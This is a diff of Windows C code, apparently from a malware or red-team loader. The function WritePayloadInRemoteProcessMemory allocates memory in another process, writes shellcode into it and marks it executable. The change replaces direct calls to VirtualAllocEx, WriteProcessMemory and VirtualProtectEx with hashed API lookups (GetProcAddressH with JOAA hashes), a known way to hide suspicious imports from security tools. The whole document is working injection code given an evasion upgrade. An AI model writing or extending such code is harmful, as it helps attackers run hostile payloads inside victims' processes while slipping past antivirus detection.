@@ -69,21 +69,36 @@ BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, 
 	}
 	DebugPrint("\t[i] Memory Protection Changed To Executable\n");
 #else
-	*pAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), VirtualAllocEx_JOAA);
+	if (!pVirtualAllocEx) {
+		DebugPrint("[!] Failed to get VirtualAllocEx address\n");
+		return FALSE;
+	}
+
+	*pAddress = pVirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (*pAddress == NULL) {
 		DebugPrint("\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 	DebugPrint("\t[i] Allocated Memory At : 0x%p \n", *pAddress);
 
-	if (!WriteProcessMemory(hProcess, *pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), WriteProcessMemory_JOAA);
+	if (!pWriteProcessMemory) {
+		DebugPrint("[!] Failed to get WriteProcessMemory address\n");
+		return FALSE;
+	}
+	if (!pWriteProcessMemory(hProcess, *pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
 		DebugPrint("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 	DebugPrint("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
-
-	if (!VirtualProtectEx(hProcess, *pAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
+	VirtualProtectEx_t pVirtualProtectEx = (VirtualProtectEx_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), VirtualProtectEx_JOAA);
+	if (!pVirtualProtectEx) {
+		DebugPrint("[!] Failed to get VirtualProtectEx address\n");
+		return FALSE;
+	}
+	if (!pVirtualProtectEx(hProcess, *pAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
 		DebugPrint("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
